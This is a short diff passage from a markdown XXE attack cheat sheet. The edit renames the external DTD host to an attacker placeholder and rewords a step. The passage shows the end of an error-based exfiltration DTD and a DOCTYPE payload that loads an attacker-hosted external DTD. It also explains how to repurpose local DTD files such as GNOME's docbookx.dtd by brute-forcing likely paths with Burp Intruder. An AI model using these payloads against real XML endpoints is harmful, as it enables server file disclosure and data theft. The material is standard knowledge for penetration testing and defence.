@@ -171,9 +171,9 @@ To retrieve data via error messages.
 %eval;
 %exfil;
 ```
-Now paste the external DTD server link in vulnerable xml field.
+Now paste the attackers external DTD server link in vulnerable xml field.
 ```xml
-<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://external.dtd.server"> %xxe; ]>
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://attacker-external.dtd.server"> %xxe; ]>
 ```
 ### Exploiting XXE to retrieve data by repurposing a local DTD against known Operating System
 Locate an existing DTD file to repurpose. For example, Linux systems using the GNOME desktop environment often have a DTD file at /usr/share/yelp/dtd/docbookx.dtd. You can test whether this file is present by submitting the following XXE payload, which will cause an error if the file is missing. Try bruteforcing with common dtd file names via burp intruder to identify local dtd file. 
